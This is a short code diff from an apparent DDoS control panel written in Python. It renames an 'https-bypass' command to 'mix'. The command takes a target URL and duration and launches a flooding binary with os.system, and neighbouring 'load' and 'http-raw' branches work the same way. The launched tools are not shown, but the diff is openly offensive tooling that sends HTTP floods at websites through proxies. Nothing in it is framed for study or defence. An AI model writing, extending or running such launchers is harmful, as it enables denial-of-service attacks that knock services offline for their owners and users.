@@ -276,14 +276,14 @@ def main():
                 print('Usage: load <url> <time> ')
                 print('Example: load http://example-cloud.com 60')
 
-        elif "https-bypass" in cnc:
+        elif "mix" in cnc:
             try:
                 url = cnc.split()[1]
                 time = cnc.split()[2]
-                os.system(f'node https.js {url} {time} proxies.txt')
+                os.system(f'./https-mix {url} {time} 900')
             except IndexError:
-                print('Usage: https-bypass <url> <time>')
-                print('Example: https-bypass http://example.org 20')
+                print('Usage: mix <url> <time>')
+                print('Example: mix http://example.org 60')
 
         elif "http-raw" in cnc:
             try:
